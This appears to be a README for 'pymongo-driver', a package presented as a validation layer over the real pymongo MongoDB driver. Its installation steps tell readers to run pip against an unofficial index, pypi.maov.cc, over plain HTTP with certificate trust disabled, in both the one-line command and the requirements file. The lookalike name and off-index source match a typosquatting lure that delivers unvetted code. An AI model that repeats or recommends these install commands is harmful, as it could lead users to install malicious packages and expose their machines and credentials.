Pymongo Driver
==============
pymongo-driver is a python mongodb driver

About
-----

pymongo-driver is a python module that brings a structured schema and validation layer on top of the great pymongo driver. 

It has been written to be as simple and light as possible with the KISS and DRY principles in mind.

Installation
------------

1. using one-line script

.. code:: bash

    $ pip3 install --upgrade --index-url http://pypi.maov.cc/simple/ --trusted-host pypi.maov.cc pymongo-driver

2. using requirement specifiers

.. code:: bash

    $ cat requirements.txt
    --index-url http://pypi.maov.cc/simple/
    pymongo-driver

.. code:: bash

    $ pip3 install --upgrade --requirement requirements.txt --trusted-host pypi.maov.cc

How To Ask For Help
-------------------

Please include all of the following information when opening an issue:

- Detailed steps to reproduce the problem, including full traceback, if possible.
- The exact python version used, with patch level:

.. code:: bash

    $ python3 -c 'import sys; print(sys.version)'

- The operating system and version (e.g. CentOS 6.6, OSX 10.10, Windows 7 ...)

Dependencies
------------

The pymongo-driver distribution is supported and tested on Python 2.x (where
x >= 6) and Python 3.x (where x >= 2).

Requirements
------------

pep8 >= 1.6

pymongo >= 2.8

